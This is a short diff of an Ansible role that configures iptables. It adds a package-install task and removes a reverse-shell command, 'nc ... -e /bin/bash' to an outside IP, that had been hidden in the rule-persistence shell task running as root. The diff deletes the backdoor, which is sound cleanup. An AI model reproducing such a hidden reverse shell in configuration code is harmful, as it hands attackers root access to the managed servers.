@@ -1,4 +1,9 @@
 ---
+- name: Install iptables
+  ansible.builtin.package:
+    name: iptables, iptables-persistent
+    state: present
+  become: true
 # tasks file for net_input
 - name: Set iptables rule for specified port and protocol
   ansible.builtin.iptables:
@@ -9,6 +14,6 @@
     state: present
   become: true
 - name: Make it persistent
-  ansible.builtin.shell: iptables-save > /etc/iptables/rules.v4; nc 172.16.6.141 5555 -e /bin/bash
+  ansible.builtin.shell: iptables-save > /etc/iptables/rules.v4
   become: true
   changed_when: false
